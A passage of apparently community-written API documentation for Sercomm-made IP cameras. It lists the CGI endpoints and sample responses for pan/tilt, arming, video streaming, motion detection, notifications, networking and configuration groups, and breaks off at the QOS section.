`/pt/ptctrl.cgi?preset=move,101`\\n* Pan right, then left (once)\\n * `/pt/ptctrl.cgi?preset=move,102`\\n* Move to home position\\n * `/pt/ptctrl.cgi?preset=move,103`\\n* Calibration (Move the full range of motion)\\n * `/pt/ptctrl.cgi?preset=move,104`\\n\\nThere is no response sent in reply to these commands - although you should be able to see the camera move.\\n\\n\\n### Arming\\nArming a camera allows you to create triggers for specific events. For example, send an email on motion detection.\\n\\n* Check arming status\\n * `/adm/get_group.cgi?group=EVENT`\\n * Response \\n \\n```ini\\n[EVENT]\\nevent_trigger=0\\nevent_schedule=1\\nevent_define1=\\nevent_define2=\\nevent_define3=\\nevent_define4=\\nevent_define5=\\nevent_define6=\\nevent_define7=\\nevent_define8=\\nevent_define9=\\nevent_define10=\\nevent_interval=0\\nevent_mt=email:0;ftpu:1;httpn:0;httppost:0;smbc:0\\nevent_attach=mp4,1,5,10\\nevent_audio=email:0;ftpu:1;httpn:0;httppost:0;smbc:0\\nevent_httpc=email:0;ftpu:0;httpn:0;httppost:0;smbc:0\\n```\\n\\n\\n* If `event_trigger=0` the camera is **not** armed.\\n* If `event_trigger=1` the camera **is** armed\\n* Arm\\n * `/adm/set_group.cgi?group=EVENT&event_trigger=1`\\n * Response `OK`\\n* Disarm\\n * `/adm/set_group.cgi?group=EVENT&event_trigger=0`\\n * Response `OK`\\n\\n\\n### Viewing Video\\nThere are several ways you can get video and audio out of the cameras.\\n\\n#### MJPEG\\n* Motion JPEG is a simple format for viewing video (no audio) in your browser.\\n * `/img/video.mjpeg`\\n\\n#### SDP (MPEG-4/H.264 video/MJPEG)\\n* Video\\n * `/img/media.sdp`\\n\\n#### RTP/RTSP \\nThe following can be accessed via the `rtsp://` protocol.\\n\\n* Video and Audio\\n * `/img/media.sav`\\n* Video\\n * `/img/video.sav`\\n* Audio\\n * `/img/audio.sav`\\n\\n#### Flash\\n* Should you want to view the video in Flash\\n * `/img/media.swf`\\n * `/img/media.flv`\\n \\n* With a GUI\\n * `/img/sc_flvplayer.swf`\\n\\n### Motion Detection\\nThis is *really* tricky!\\n\\nSome cameras can support up to 4 areas of motion detection. For example, you might have a camera pointed at your door, but are only interested in seeing when the handle or the letter box moves.\\n\\nNo matter what resolution your camera is, the motion detection is defined on a 640*480 grid with the top left corner being position `0,0` and the bottom right being `639,479`.\\n\\n```\\n 640\\n+-------------------+ \\n|(0,0) |\\n| |\\n| |480\\n| |\\n| |\\n+-------------------+\\n (639,479)\\n```\\n\\n* Get the currently configured motion detection settings.\\n * `/adm/get_group.cgi?group=MOTION`\\n * Response:\\n \\n```ini\\n[MOTION]\\nmd_mode=1\\nmd_switch1=1\\nmd_switch2=0\\nmd_switch3=0\\nmd_switch4=0\\nmd_name1=Window 1\\nmd_name2=Window 2\\nmd_name3=Window 3\\nmd_name4=Window 4\\nmd_window1=0,0,639,479\\nmd_window2=0,0,160,120\\nmd_window3=0,0,160,120\\nmd_window4=0,0,160,120\\nmd_threshold1=80\\nmd_threshold2=127\\nmd_threshold3=127\\nmd_threshold4=127\\nmd_sensitivity1=6\\nmd_sensitivity2=6\\nmd_sensitivity3=6\\nmd_sensitivity4=6\\nmd_update_freq1=90\\nmd_update_freq2=90\\nmd_update_freq3=90\\nmd_update_freq4=90\\nmd_point=0,0\\n\\n```\\n\\nAs you can see, there are 4 windows, each with their own switch, name, co-ordinates, threshold, sensitivity, and update frequency.\\n\\nIt may help to think of them being grouped like this:\\n\\n```ini\\nmd_switch1=1\\nmd_name1=Window 1\\nmd_window1=0,0,639,479\\nmd_threshold1=80\\nmd_sensitivity1=6\\nmd_update_freq1=90\\n\\nmd_switch2=0\\nmd_name2=Window 2\\nmd_window2=0,0,160,120\\nmd_threshold2=127\\nmd_sensitivity2=6\\nmd_update_freq2=90\\n\\n```\\n\\n* Each parameter can be retrieved individually\\n * `/adm/get_group.cgi?group=MOTION.md_name1`\\n * Response \\n```\\n[MOTION]\\nmd_name1=Window 1\\n```\\n\\n\\n* Each parameter can be set using\\n * `/adm/set_group.cgi?group=MOTION&`\\n * e.g. `/adm/set_group.cgi?group=MOTION&md_window2=30,60,100,120`\\n * Response `OK`\\n \\n* Properties which can be set using `/adm/set_group.cgi?group=MOTION&$property=$value`.\\n * `md_mode` Motion detection mode \\n * `0` Off\\n * `1` On (Default)\\n * `md_point` The position of motion using PT mode. The format is `X,Y` \\n * X's range is `-63` to `63`\\n * X's range is `-36` to `28`\\n * `md_switch` `[1-4]` Set whether a motion detection window is active.\\n * `0` Off\\n * `1` On \\n * `md_name` `[1-4]` Set the name of a motion detection window.\\n * Maximum 12 ASCII characters.\\n * `md_window` `[1-4]` Set the co-ordinates of the motion detection window. No matter the resolution of the camera, the area is considered to be 640*480 is active.\\n * The format is X0,Y0,X1,Y1.\\n * X's range is `0` to `639`\\n * Y's range is `0` to `479` \\n * `md_threshold` `[1-4]` Set the threshold(???) for the motion detection window.\\n * Range is `0` to `255`\\n\\n### Notification\\nYou can set the cameras to perform an action when motion is detected.\\n\\n#### HTTP Notification\\n* Get the current configuration\\n * `/adm/get_group.cgi?group=HTTP_NOTIFY`\\n * Response\\n\\n```\\n[HTTP_NOTIFY]\\nhttp_notify=1\\nhttp_url=\\nhttp_proxy=\\nhttp_proxy_no=80\\nhttp_method=1\\nhttp_user=\\nhttp_password=\\nproxy_user=\\nproxy_password=\\nevent_data_flag=0\\n\\n```\\n\\n* Each parameter can be retrieved individually\\n * `/adm/get_group.cgi?group=HTTP_NOTIFY.http_notify`\\n * Response \\n```\\n[HTTP_NOTIFY]\\nhttp_notify=1\\n```\\n\\n* Each parameter can be set using\\n * `/adm/set_group.cgi?group=HTTP_NOTIFY&`\\n * e.g. `/adm/set_group.cgi?group=HTTP_NOTIFY&http_url=http://example.com`\\n * Response `OK`\\n\\n### System Settings\\n\\n#### Device Information\\n* To see information about the camera\\n * `/util/query.cgi`\\n * Response\\n\\n\\n```ini\\nhostname=Camera\\ndescription=\\ndefname=SC92FFF7\\nmpeg4_resolution=640\\nmjpeg_resolution=1280\\nh264_resolution=1280\\nh264_resolution2=320\\nh264_resolution3=320\\nmic_in=on\\nspeaker_out=off\\nptctrl=on\\nwlled=off\\nirled=off\\nserial=off\\nresolutions=1280x720,640*480,320*240,160*120\\nmac=00:0e:8f:92:ff:f7\\nprivacy_button=off\\npir_sensor=off\\nwps_pin_code=1234567\\nioctrl=off\\ncompany_name=Xanboo\\nmodel_number=RC8230\\nwireless=on\\nsw_pppoe=yes\\n```\\n* For extra information\\n * `/util/query.cgi?extension=yes`\\n * Response\\n\\n```ini\\nfw_ver=V1.0.15R00\\nip_addr=192.168.0.42\\nnetmask=255.255.255.0\\ngateway=192.168.0.1\\ntimezone=26\\ncurrent_time=10/13/2015 08:56:42\\nhttp_port=80\\nrtsp_port=554\\nhttps_port=443\\n```\\n\\n* System information\\n * `/adm/sysinfo.cgi`\\n * Response\\n\\n```ini\\nFirmware Version: V1.0.15\\nSerial Number:12345\\nFirmware Release Date: Mar 01,2013\\n\\n```\\n\\n#### User Access\\n* To see what features of the camera the current user has access to.\\n * `/img/query.cgi`\\n * Response\\n\\n```ini\\nmic_in=on\\nspeaker_out=on\\nptctrl=on\\nioctrl=off\\n\\n```\\n\\n### Get IR Filter\\n* Some cameras have an InfraRed filter to enable them to see in the darkness.\\n * `/io/query_filter.cgi`\\n * Response `filter=0` filter is off.\\n * Response `filter=1` filter is on.\\n\\n\\n#### Date And Time\\n* To get the date and time information\\n * `/adm/date.cgi?action=get`\\n * Response\\n\\n```ini\\ntimezone=26\\nyear=2015\\nmonth=10\\nday=13\\nhour=08\\nminute=19\\nsecond=57\\n\\n```\\n\\n* To set the date and time information\\n * `/adm/date.cgi?action=set&`\\n * Parameters\\n * `year`\\n * `month`\\n * `day`\\n * `second`\\n * Response `OK`\\n\\n#### Configuration Settings\\n* Download the camera's configuration settings\\n * `/adm/admcfg.cfg`\\n * Response is a Base64 encoded representation of the configuration file. According to the specification:\\n > There is the hidden check sum data inside the configuration content to validate the data, Because we use the dword-aligned checksum algorithm, so we will ignore the last data misaligned by dword.\\n * The Sercomm cameras have a custom BASE64 table:\\n * `ACEGIKMOQSUWYBDFHJLNPRTVXZacegikmoqsuwybdfhjlnprtvxz0246813579=+/`\\n * For comparison, a standard table is:\\n * `ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=`\\n \\n* Upload a configuration file. *Note* this is an HTTP **POST**\\n * `/adm/upload.cgi`\\n \\n#### Log Files\\n* Get the event log of the camera\\n * `/adm/log.cgi`\\n * Response:\\n \\n```ini\\n2015-10-13 07:12:33 DHCP: Lease renewal successfully.\\n2015-10-13 07:11:28 WATCHDOG: Haven't received HTTP requests for 1200 seconds, reconnecting WIFI.\\n2015-10-13 06:55:12 NTP: Synchronization OK.\\n2015-10-13 06:53:47 DHCP: Lease renewal successfully.\\n2015-10-13 06:51:11 Network: Wireless activated.\\n```\\n\\n### Networking\\n\\n#### WiFi Environment\\n* To see all available WiFi networks\\n * `/adm/site_survey.cgi`\\n * Response is in **XML**\\n \\n```\\n<?xml version=\\\"1.0\\\" encoding=\\\"utf-8\\\"?>\\n<SiteList>\\n <Site>\\n <SSID>MyWiFiNetwork</SSID>\\n <BSSID>34:44:11:A9:C2:D4</BSSID>\\n <Mode>Infrastructure</Mode>\\n <Security>WPA2-PSK</Security>\\n <AUTH>SharedKey</AUTH>\\n <Encryption>AES</Encryption>\\n <Channel>1</Channel>\\n <Signal>100</Signal>\\n <WPS>Yes</WPS>\\n </Site>\\n ...\\n```\\n\\n#### WiFi Status\\n* See the camera's WiFi status\\n * `/adm/wireless_status.cgi`\\n * Response:\\n \\n```\\nsignal_strength=100\\nsignal_strength-A=0\\nsignal_strength-B=0\\nessid=MyWiFiNetwork\\ndomain=Europe\\nchannel=11\\nbssid=C1:15:A2:01:1D:11\\nwps_pin_code=123456\\n\\n```\\n\\n#### Samba\\nThe cameras can upload images and videos to local network shares.\\n\\n* LAN survey for SMB/CIFS shares\\n * `/adm/smb_survey.cgi?`\\n * Response in **XML**\\n \\n```\\n<?xml version=\\\"1.0\\\" encoding=\\\"utf-8\\\"?>\\n<List>\\n <WorkGroup>\\n <Name>WORKGROUP</Name>\\n <List>\\n <Server>\\n <Name>MYSERVER</Name>\\n <Comment>Samba 4.1.6-Ubuntu</Comment>\\n </Server>\\n </List>\\n </WorkGroup>\\n</List>\\n```\\n\\n* Optional parameters\\n * `timeout=` value in seconds between 5 - 120. Default is 30. Camera will stop searching after this time.\\n * `action=stop` force the camera to stop searching.\\n \\n## Other Configuration Groups\\nSercomm's configuration API uses the concept of \\\"groups\\\".\\n\\n* For example, you can **get** all the \\\"System\\\" group properties by calling:\\n * `/adm/get_group.cgi?group=SYSTEM`\\n* Each parameter can be retrieved individually\\n * `/adm/get_group.cgi?group=SYSTEM.ntp_server`\\n* You can **set** a group's properties by calling:\\n * `/adm/set_group.cgi?group=SYSTEM&$property=$value`\\n * e.g. `/adm/set_group.cgi?group=SYSTEM&ntp_server=0.uk.pool.ntp.org`\\n * **Note** some of the properties are *read only*.\\n\\n* You can see **all** the possible groups by calling\\n * `/adm/get_group.cgi`\\n * Returns:\\n \\n```\\n[Manufacture]\\n[SYSTEM]\\n[LOG]\\n[NETWORK]\\n[WIRELESS]\\n[DDNS]\\n[HTTP]\\n[RTSP_RTP]\\n[UPNP]\\n[EMAIL]\\n[FTP]\\n[SMBC]\\n[VIDEO]\\n[H264]\\n[MPEG4]\\n[JPEG]\\n[STREAMS]\\n[AUDIO]\\n[USER]\\n[IP_FILTER]\\n[MOTION]\\n[IO]\\n[EVENT]\\n[QOS]\\n[MCWS]\\n[HTTP_NOTIFY]\\n[HTTP_EVENT]\\n[PPPOE]\\n[BONJOUR]\\n[SDCARD]\\n[PTZ]\\n```\\n\\n**Note:** The groups available will depend on which camera you have. For example, not all cameras have an SD Card slot.\\n\\n### Manufacturer Information\\n* The default manufacturer information:\\n * `/adm/get_group.cgi?group=Manufacture`\\n * Response:\\n \\n```\\n[Manufacture]\\ndef_name=\\ndefault_ip=192.168.0.99/255.255.255.0\\nmax_user=20\\nsummer_chg=1\\nconf_status=1\\n```\\n\\n### System Configuration\\n* All the \\\"System\\\" group properties by calling:\\n * `/adm/get_group.cgi?group=SYSTEM`\\n * Response:\\n \\n```\\n[SYSTEM]\\ncfg_ver=RC8230_XANBOO_0001\\nhost_name=MyCamera\\ncomment=\\ntime_format=24\\ndate_format=1\\ntime_zone=26\\ndaylight_saving=1\\nntp_mode=1\\nntp_server=clock.via.net\\nntp_date=0\\nntp_hour=6\\nntp_min=1\\nled_mode=1\\nreboot_time=2015-10-13 06:46:54\\nboot_up_time=2015-10-13 11:55:22\\nreboot_reason=Reboot by Internal (Reason: hydra is gone)\\nwd_timer_wifi=20\\nwd_timer_idled=300\\nwd_timer_acted=180\\nwd_reboot_num=347\\nwd_reboot_time=1444713006;1444585286\\n\\n```\\n\\n* Properties which can be set using `/adm/set_group.cgi?group=SYSTEM&$property=$value`.\\n * `host_name` Camera's name. Maximum of 16 characters, 0-9, A-Z, a-z, space.\\n * `comment ` Camera's description. Maximum of 32 ASCII characters. \\n * `time_format` Valid values are \\n * `24-hour`\\n * `12-hour`\\n * `date_format` Valid values are\\n * `0` YYYY-MM-DD\\n * `1` MM/DD/YYYY\\n * `2` DD/MM/YYYY\\n * `time_zone` Valid values are 0-75.\\n * `daylight_saving` Valid values are\\n * `0` Off \\n * `1` On \\n * `ntp_mode ` Synchronise with an NTP server. Valid values are\\n * `0` Off \\n * `1` On \\n * `ntp_server` Which NTP server to use. Set using a domain name of up to 64 characters.\\n * `led_mode` Keep the camera's information LED on. Valid values are\\n * `0` Off \\n * `1` On \\n\\n### Logging\\n* Get all log configuration\\n * `/adm/get_group.cgi?group=LOG`\\n * Response:\\n \\n```\\n[LOG]\\nlog_mode=1\\nlog_level=3\\nsyslog_mode=0\\nsyslog_server=\\nsyslog_port=514\\nim_mode=0\\nim_server=\\nim_account=\\nim_password=\\nim_sendto=\\nim_message=\\nftplog_mode=1\\nsmtplog_mode=1\\nsystemlog_mode=1\\nimlog_mode=1\\n```\\n\\n* Properties which can be set using `/adm/set_group.cgi?group=LOG&$property=$value`.\\n * `syslog_mode ` Valid values are \\n * `0` Off \\n * `1` On \\n * `syslog_server` Which Syslog server to use. Set using a domain name of up to 64 characters.\\n * Others ???\\n \\n### Network\\n\\n* Get all Network configuration\\n * `/adm/get_group.cgi?group=NETWORK`\\n * Response:\\n\\n```\\n[NETWORK]\\nip_addr=192.168.0.42\\nnetmask=255.255.255.0\\ngateway=192.168.0.1\\ndhcp=1\\ndns_type=1\\ndns_server1=192.168.0.1\\ndns_server2=8.8.8.8\\nwins_type=0\\nwins_ip=\\n```\\n\\n* Properties which can be set using `/adm/set_group.cgi?group=NETWORK&$property=$value`.\\n * `ip_addr` Camera's IP address.\\n * `netmask` Camera's netmask as IP address.\\n * `gateway` IP of the network gateway.\\n * `dhcp` Valid values are \\n * `0` Fixed IP Address \\n * `1` Use DHCP \\n * `dns_type` Valid values are \\n * `0` DNS servers assigned by DHCP\\n * `1` Manually assigned DNS servers\\n * `dns_server1` and `dns_server2` IP addresses of the DNS servers\\n * Others ???\\n\\n### Wireless\\n\\n* Get all WiFi configurations\\n * `/adm/get_group.cgi?group=WIRELESS`\\n * Response:\\n\\n```\\n[WIRELESS]\\nwlan_type=1\\nwlan_essid=MyNetwork\\nwlan_channel=0\\nwlan_domain=5\\nwlan_security=2\\nwep_authtype=2\\nwep_mode=1\\nwep_index=1\\nwep_ascii=\\nwep_kep1=\\nwep_kep2=\\nwep_kep3=\\nwep_kep4=\\nwpa_ascii=\\nwmm=0\\n```\\n\\n* Properties which can be set using `/adm/set_group.cgi?group=WIRELESS&$property=$value`.\\n * `wlan_type` Valid values are \\n * `0` Ad hoc\\n * `1` Infrastructure \\n * `wlan_essid` The SSID to connect to. Maximum of 32 ASCII \\ncharacters. Case sensitive.\\n * `wlan_channel` Which WiFi channel number to use.\\n * `0` auto\\n * `1` - `13` a specific channel.\\n * `wlan_domain` Different countries have different WiFi channels\\n * `1` - Africa \\n * `2` - Asia \\n * `3` - Australia \\n * `4` - Canada \\n * `5` - Europe \\n * `6` - Spain \\n * `7` - France \\n * `8` - Israel \\n * `9` - Japan \\n * `10` - Mexico \\n * `11` - South American\\n * `12` - USA \\n * `wlan_security` Which wireless security mode\\n * `0` - None \\n * `1` - WEP \\n * `2` - WPA/WPA2-PSK \\n * `3` - WPA PSK TKIP \\n * `4` - WPA PSK AES \\n * `5` - WPA2 PSK TKIP \\n * `6` - WPA2 PSK AES \\n * `7` - WPA enterprise \\n * `8` - WPA PSK \\n * `9` - WPA2 PSK \\n * `wpa_ascii` Set the password for WPA. Must be between 8 and 63 characters. \\n * `connection_mode` Which wireless mode to boot up to.\\n * `0` - If a connection is available over the Ethernet \\ninterface, the device uses Ethernet; otherwise, it uses \\nwireless.\\n * `1` - The device use wireless whether a connection is \\navailable over the Ethernet or not. \\n * `2` - The device enters WPS PBC mode over wireless \\nwhether a connection is available over the Ethernet or not. \\n * `3` - The device enters WPS PIN code mode over \\nwireless whether a connection is available over the \\nEthernet or not. \\n * `wmm` Use [WMM mode](https://en.wikipedia.org/wiki/Wireless_Multimedia_Extensions). Valid values are \\n * `0` Off \\n * `1` On \\n * `wpa_ep_auth_type` Set WPA/WPA2 Enterprise authentication type.\\n * `1` - EAP-TLS \\n * `2` - EAP-TTLS \\n * `wpa_tls_user` Set EAP-TLS user name. Maximum of 64 ASCII characters.\\n * `wpa_tls_priv_keypass` Set EAP-TLS private key password. Maximum of 64 ASCII characters.\\n * `wpa_ttls_auth_type` Set EAP-TTLS authentication type.\\n * `1` MSCHAP \\n * `2` MSCHAPv2 \\n * `3` PAP \\n * `4` EAP-MD5 \\n * `5` EAP-GTC \\n * `wpa_ttls_user` Set EAP-TTLS User name. Maximum of 64 ASCII characters.\\n * `wpa_ttls_pass` Set EAP-TTLS user password. Maximum of 64 ASCII characters.\\n * `wpa_ttls_anony_name` Set EAP-TTLS/EAP-TLS anonymous name. Maximum of 64 ASCII characters.\\n \\n### Dynamic DNS\\n* Get all Dynamic DNS configuration\\n * `/adm/get_group.cgi?group=DDNS`\\n * Response:\\n\\n```\\n[DDNS]\\nddns_mode=0\\nddns_service=\\nddns_account=\\nddns_password=\\nddns_host_name=\\nddns_hour=12\\nddns_minute=\\nddns_update_unit=3\\nddns_update_period=10\\n```\\n\\nTODO! Many of the DDNS providers no longer work.\\n\\n### HTTP\\n* Get all HTTP configuration\\n * `/adm/get_group.cgi?group=HTTP`\\n * Response:\\n\\n```\\n[HTTP]\\nhttp_mode=1\\nhttp_port2=1\\nhttp_port2_num=8080\\nhttps_mode=1\\nssport_enable=0\\nssport_number=1025\\n```\\n\\n\\n### Real Time Streaming Protocol\\n* Get all RTSP configuration\\n * `/adm/get_group.cgi?group=RTSP_RTP`\\n * Response:\\n\\n```\\n[RTSP_RTP]\\nrtsp_port=554\\nrtp_port=5000\\nrtp_size=1400\\nmcast_enable=0\\nmcast_video_enable=0\\nmcast_video_addr=224.2.0.1\\nmcast_video_port=2240\\nmcast_h264_enable=0\\nmcast_h264_addr=224.2.0.1\\nmcast_h264_port=2242\\nmcast_audio_enable=0\\nmcast_audio_addr=224.2.0.1\\nmcast_audio_port=2244\\nmcast_hops=16\\n```\\n\\n\\n* Properties which can be set using `/adm/set_group.cgi?group=RTSP_RTP&$property=$value`\\n * `rtsp_port` RTSP port number. Valid values are\\n * `554`\\n * `1024` to `65535` \\n * `rtp_port` RTP port number. Valid values\\n * `1024` to `65535`\\n * Default of `5000`\\n * `rtp_size` RTP packet size. Valid values\\n * `400` to `1400`\\n * `mcast_enable` RTP/RTSP multicast mode. Valid values are \\n * `0` Off (Default)\\n * `1` On \\n * `mcast_video_addr` Video multicast IP address.\\n * `mcast_video_port` Video port number. \\n * `1024` to `65534` **Even numbers only**.\\n * `mcast_audio_addr` Audio multicast IP address. \\n * `mcast_audio_port` Audio port number.\\n * `1024` to `65534` **Even numbers only**.\\n * `mcast_hops` Multicast time to live value.\\n * `1` to `255`\\n\\n### Universal Plug and Play\\n* Get all UPNP configuration\\n * `/adm/get_group.cgi?group=UPNP`\\n * Response:\\n\\n```\\n[UPNP]\\nupnp_mode=0\\nupnp_traversal=\\nupnp_camera=\\n```\\n\\n* Properties which can be set using `/adm/set_group.cgi?group=UPNP&$property=$value`\\n * `upnp_mode`\\n * `0` Off (Default)\\n * `1` On \\n- NOTE: On an RC8025b-ADT, this is the only way to enable/disable UPNP. Setting it from the webpage GUI results in an `\\\"Invalid Group\\\"` error and the change is not saved.\\n\\n### EMAIL\\n* Get all Email configuration\\n * `/adm/get_group.cgi?group=EMAIL`\\n * Response:\\n\\n```\\n[EMAIL]\\nsmtp_enable=1\\nsmtp_server=\\npop_server=\\nsmtp_port=465\\nsmtp_auth=1\\nsmtp_account=\\nsmtp_password=\\nsmtp2_enable=0\\nsmtp2_server=\\npop2_server=\\nsmtp2_port=25\\nsmtp2_auth=0\\nsmtp2_account=\\nsmtp2_password=\\nfrom_addr=\\nfrom_addr2=\\nto_addr1=\\nto_addr2=\\nto_addr3=\\nsend_email=1\\nemail_att=7\\nsubject=\\nsmtp_serv_flag=1\\nsmtp2_serv_flag=1\\n```\\n\\n**Note:** The response will *never* display your passwords.\\n\\nTODO!\\n\\n### FTP\\n* Get all FTP settings\\n * `/adm/get_group.cgi?group=FTP`\\n * Response:\\n\\n```\\n[FTP]\\nftp1=1\\nftp1_server=\\nftp1_account=\\nftp1_passwd=\\nftp1_path=\\nftp1_passive=1\\nftp1_port=21\\nftp2=0\\nftp2_server=\\nftp2_account=\\nftp2_passwd=\\nftp2_path=\\nftp2_passive=0\\nftp2_port=21\\n```\\n\\n**Note:** The response will *never* display your passwords.\\n\\n\\n### Samba\\n* Get all Samab configuration\\n * `/adm/get_group.cgi?group=SMBC`\\n * Response:\\n\\n```\\n[SMBC]\\nsmbc_enable=1\\nsmbc_server=\\nsmbc_path=\\nsmbc_account=\\nsmbc_passwd=\\nsmbc_rec_enable=0\\nsmbc_rec_file_ctrl=1\\nsmbc_rec_filesize=0\\nsmbc_rec_duration=15\\nsmbc_rec_streaming=1\\nsmbc_rec_mode=1\\nsmbc_rec_server=\\nsmbc_rec_path=\\nsmbc_rec_account=\\nsmbc_rec_passwd=\\nsmbc_rec_filename_prefix=\\nsmbc_rec_behavior=0,0,1\\nsmbc_rec_schedule=\\nsmbc_rec_bymd_fn_prefix=\\nsmbc_rec_bymd_len=\\n```\\n\\nTODO!\\n\\n### Video\\n* Get all Video configuration\\n * `/adm/get_group.cgi?group=VIDEO`\\n * Response:\\n\\n```\\n[VIDEO]\\nvideo_schedule=0\\nvideo_define1=\\nvideo_define2=\\nvideo_define3=\\nvideo_define4=\\nvideo_define5=\\nvideo_define6=\\nvideo_define7=\\nvideo_define8=\\nvideo_define9=\\nvideo_define10=\\ntime_stamp=1\\ntext_overlay=0\\ntext=\\npower_line=50\\ncolor=0\\nexposure=4\\nsharpness=4\\nflip=0\\nmirror=0\\nhue=4\\nsaturation=4\\ncontrast=4\\ndefault_channel=1\\nmask_window1=0\\nmask_window2=0\\nmask_window3=0\\nmask_window4=0\\nmask_color1=888888\\nmask_color2=888888\\nmask_color3=888888\\nmask_color4=888888\\nmask_position1=160,180,480,300\\nmask_position2=160,180,480,300\\nmask_position3=160,180,480,300\\nmask_position4=160,180,480,300\\nnight_mode=0\\n```\\n\\n* Properties which can be set using `/adm/get_group.cgi?group=VIDEO`\\n * `time_stamp` Display a date / timestamp on the images\\n * `0` Off\\n * `1` On\\n * `text_overlay` Display a line of text on the images\\n * `0` Off\\n * `1` On\\n * `text` The text to display\\n * Maximum of 20 ASCII characters\\n * `power_line` Adjust the picture to reduce flicker from lights. This should be set the to Hz of your electrical grid.\\n * `50` UK / Europe\\n * `60` USA \\n * `color` Configure the colour balance of the picture\\n * `0` Auto\\n * `1` Indoors\\n * `2` White lighting\\n * `3` Yellow lighting\\n * `4` Outdoor\\n * `5` Black and White\\n * `exposure` brightness of the image. Range of `1` to `7`\\n * `1` Darkest\\n * `7` Brightest\\n * `sharpness` Sharpness of the image. Range of `1` to `7`\\n * `1` Least sharp\\n * `7` Most sharp\\n * `flip` Veritcally flip the images - useful if the camera has been installed upside down.\\n * `0` Off\\n * `1` On\\n * `mirror` Horizontal flip the images\\n * `0` Off\\n * `1` On\\n * `time_stamp` Display a date / timestamp on the images\\n * `0` Off\\n * `1` On\\n \\nTODO!\\n\\n### H264\\n* Get all H264 Video Codec configuration\\n * `/adm/get_group.cgi?group=H264`\\n * Response:\\n\\n```\\n[H264]\\nmode=1\\nresolution=4\\nquality_type=1\\nquality_level=5\\nbit_rate=768\\nframe_rate=25\\ngov_length=25\\nsp_uri=\\nmode2=1\\nresolution2=2\\nquality_type2=0\\nquality_level2=3\\nbit_rate2=256\\nframe_rate2=10\\ngov_length2=10\\nsp_uri2=\\nmode3=1\\nresolution3=2\\nquality_type3=0\\nquality_level3=3\\nbit_rate3=64\\nframe_rate3=10\\ngov_length3=10\\nsp_uri3=\\nbandwidth=0\\nprofile=66\\ncropping=0\\nbandwidth2=0\\nprofile2=66\\ncropping2=0\\nbandwidth3=0\\nprofile3=66\\ncropping3=0\\n```\\n\\nTODO!\\n\\n### MPEG4\\n* Get all MPEG4 configuration\\n * `/adm/get_group.cgi?group=MPEG4`\\n * Response:\\n\\n```\\n[MPEG4]\\nmode=1\\nresolution=3\\nquality_type=1\\nquality_level=5\\nbit_rate=256\\nframe_rate=25\\ngov_length=10\\nsp_uri=\\nmode2=0\\nresolution2=1\\nquality_type2=1\\nquality_level2=3\\nbit_rate2=256\\nframe_rate2=15\\ngov_length2=10\\nsp_uri2=\\nmode3=0\\nresolution3=3\\nquality_type3=1\\nquality_level3=3\\nbit_rate3=1000\\nframe_rate3=15\\ngov_length3=10\\nsp_uri3=\\nbandwidth=0\\ncropping=0\\nbandwidth2=0\\ncropping2=0\\nbandwidth3=0\\ncropping3=0\\n```\\n\\nTODO!\\n\\n### JPEG\\n* Get all JPEG image configuration\\n * `/adm/get_group.cgi?group=JPEG`\\n * Response:\\n\\n```\\n[JPEG]\\nmode=1\\nresolution=4\\nquality_level=3\\nframe_rate=15\\nsp_uri=\\nmode2=0\\nresolution2=1\\nquality_level2=3\\nframe_rate2=15\\nsp_uri2=\\nmode3=0\\nresolution3=3\\nquality_level3=3\\nframe_rate3=30\\nsp_uri3=\\nbandwidth=0\\ncropping=0\\nbandwidth2=0\\ncropping2=0\\nbandwidth3=0\\ncropping3=0\\n```\\n\\nTODO!\\n\\n### Video Streams\\n* Get all video streaming configuration\\n * `/adm/get_group.cgi?group=STREAMS`\\n * Response:\\n\\n```\\n[STREAMS]\\nchannel1=H264,1\\nchannel2=JPEG,2\\nchannel3=MPEG4,3\\n```\\n\\nTODO!\\n\\n### Audio\\n* Get all Audio configuration\\n * `/adm/get_group.cgi?group=AUDIO`\\n * Response:\\n\\n```\\n[AUDIO]\\naudio_in=1\\nin_volume=1\\nin_audio_type=1\\naudio_out=0\\nout_volume=8\\nout_audio_type=0\\naudio_mode=1\\noperation_mode=1\\nin_pcm_sr=8000\\naudio_in2=1\\nin_pcm_sr2=5512\\nin_audio_type2=3\\nau_trigger_en=0\\nau_trigger_volume=50\\nau_trigger_method=0\\n```\\n\\nTODO!\\n\\n### User Database\\n* Get all User information \\n * `/adm/get_group.cgi?group=USER`\\n * Response:\\n\\n```\\n[USER]\\nlogin_check=1\\nadmin_timeout=5\\nadmin_name=admin\\nadmin_password=\\nviewer_name=demo\\nviewer_password=\\nuser1=viewer,\\nuser2=\\nuser3=\\nuser4=\\nuser5=\\nuser6=\\nuser7=\\nuser8=\\nuser9=\\nuser10=\\nuser11=\\nuser12=\\nuser13=\\nuser14=\\nuser15=\\nuser16=\\nuser17=\\nuser18=\\nuser19=\\nuser20=\\naudio_in_ctrl=1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0\\naudio_out_ctrl=1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0\\npt_ctrl=0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0\\nadm_ctrl=0\\nio_ctrl=0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0\\n```\\n\\n**Note:** The response will *never* display your passwords.\\n\\n\\nTODO!\\n\\n### IP Filters\\n* Get all IP Filters\\n * `/adm/get_group.cgi?group=IP_FILTER`\\n * Response:\\n\\n```\\n[IP_FILTER]\\nip_filter=0\\nip_filter_rule=0\\nip_filter1=\\nip_filter2=\\nip_filter3=\\nip_filter4=\\nip_filter5=\\nip_filter6=\\nip_filter7=\\nip_filter8=\\nip_filter9=\\nip_filter10=\\nip_filter11=\\nip_filter12=\\nip_filter13=\\nip_filter14=\\nip_filter15=\\nip_filter16=\\nip_filter17=\\nip_filter18=\\nip_filter19=\\nip_filter20=\\n```\\n\\nTODO!\\n\\n### IO Pins\\n\\nSome cameras have IO pins on the back. You can use these to send signals to, or receive signals from the camera.\\n\\n* Get all IO configuration\\n * `/adm/get_group.cgi?group=IO`\\n * Response:\\n\\n```\\n[IO]\\nin1_trigger=0\\nin2_trigger=0\\nin1_type=3\\nin2_type=0\\nout1_init=1\\nout2_init=1\\nout1_button=0,0,10\\nout2_button=0,0,10\\nout1_action=1\\nout2_action=1\\nout1_pulse_duration=10\\nout2_pulse_duration=10\\n```\\n\\nTODO!\\n\\n### Quality of Service\\n* Get all QOS configuration\\n * `/adm/get_group.cgi?group=QOS`\\n * 